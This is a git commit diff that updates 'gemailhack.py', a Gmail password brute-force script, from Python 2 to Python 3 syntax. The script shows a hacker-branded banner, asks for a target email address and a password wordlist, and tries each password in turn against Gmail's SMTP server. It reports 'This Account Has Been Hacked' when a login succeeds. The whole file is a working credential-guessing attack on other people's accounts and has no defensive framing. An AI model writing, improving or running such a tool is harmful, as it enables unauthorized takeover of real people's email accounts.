eebc17747b634d03117e85335df655ad9174c7fe
Nrgodara <155721977+Nrgodara@users.noreply.github.com>
2024-02-03 13:32:55 +0530

    Update gemailhack.py

--- gemailhack.py
+++ gemailhack.py
@@ -1,74 +1,78 @@
-#!/usr/bin/python
-'''create by Ha3MrX'''
+#!/usr/bin/python3
+'''created by Ha3MrX'''
 
 import smtplib
 from os import system
 
 def main():
-   print '================================================='
-   print '               created By  🅜🅐🅗🅘®👿                 '
-   print '================================================='
-   print '               ++++++++++++++++++++              '
-   print '\n                                               '
-   print '  _,.                                            '
-   print '                                                 '
-   print '                                                 '
-   print '           🅜🅐🅗🅘®👿                                '
-   print '       _,.                   '
-   print '     ,` -.)                  '
-   print '    ( _/-\\-._               '
-   print '   /,|`--._,-^|            , '
-   print '   \_| |`-._/||          , | '
-   print '     |  `-, / |         /  / '
-   print '     |     || |        /  /  '
-   print '      `r-._||/   __   /  /   '
-   print '  __,-<_     )`-/  `./  /    '
-   print '  \   `---    \   / /  /     '
-   print '     |   🅜      |./  /      '
-   print '     /   ❤️‍🔥    //  /       '
-   print ' \_/  \  🅐     |/  /        '
-   print '  |    | 🅗_,^- /  /         '
-   print '  |    , 🅘  (\/  /_         '
-   print '   \,.->._    \X-=/^         '
-   print '   (  /   `-._//^`           '
-   print '    `Y-.____(__}             '
-   print '     |     {__)              ' 
-   print '           ()   V.1.0        '
+    print('=================================================')
+    print('               created By  🅜🅐🅗🅘®👿                 ')
+    print('=================================================')
+    print('               ++++++++++++++++++++              ')
+    print('\n                                               ')
+    print('  _,.                                            ')
+    print('                                                 ')
+    print('                                                 ')
+    print('           🅜🅐🅗🅘®👿                                ')
+    print('       _,.                   ')
+    print('     ,` -.)                  ')
+    print('    ( _/-\\-._               ')
+    print('   /,|`--._,-^|            , ')
+    print('   \_| |`-._/||          , | ')
+    print('     |  `-, / |         /  / ')
+    print('     |     || |        /  /  ')
+    print('      `r-._||/   __   /  /   ')
+    print('  __,-<_     )`-/  `./  /    ')
+    print('  \   `---    \   / /  /     ')
+    print('     |   🅜      |./  /      ')
+    print('     /   ❤️‍🔥    //  /       ')
+    print(' \_/  \  🅐     |/  /        ')
+    print('  |    | 🅗_,^- /  /         ')
+    print('  |    , 🅘  (\/  /_         ')
+    print('   \,.->._    \X-=/^         ')
+    print('   (  /   `-._//^`           ')
+    print('    `Y-.____(__}             ')
+    print('     |     {__)              ')
+    print('           ()   V.1.0        ')
 
 main()
-print '[1] start the attack, all Thanks to MAHI® Boss'
-print '[2] exit'
+print('[1] start the attack, all Thanks to MAHI® Boss')
+print('[2] exit')
 option = input('==>')
-if option == 1:
-   file_path = raw_input('path of passwords file :')
+
+if int(option) == 1:
+    file_path = input('path of passwords file:')
 else:
-   system('clear')
-   exit()
-pass_file = open(file_path,'r')
+    system('clear')
+    exit()
+
+pass_file = open(file_path, 'r')
 pass_list = pass_file.readlines()
+
 def login():
     i = 0
-    user_name = raw_input('target email :')
+    user_name = input('target email:')
     server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
     server.ehlo()
+    
     for password in pass_list:
-      i = i + 1
-      print str(i) + '/' + str(len(pass_list))
-      try:
-         server.login(user_name, password)
-         system('clear')
-         main()
-         print '\n'
-         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
-         break
-      except smtplib.SMTPAuthenticationError as e:
-         error = str(e)
-         if error[14] == '<':
+        i = i + 1
+        print(str(i) + '/' + str(len(pass_list)))
+        try:
+            server.login(user_name, password)
             system('clear')
             main()
-            print '[+] this account has been hacked, password :' + password + '     ^_^'
-
+            print('\n')
+            print('[+] This Account Has Been Hacked Password :' + password + '     ^_^')
             break
-         else:
-            print '[!] password not found => ' + password
+        except smtplib.SMTPAuthenticationError as e:
+            error = str(e)
+            if error[14] == '<':
+                system('clear')
+                main()
+                print('[+] this account has been hacked, password :' + password + '     ^_^')
+                break
+            else:
+                print('[!] password not found => ' + password)
+
 login()
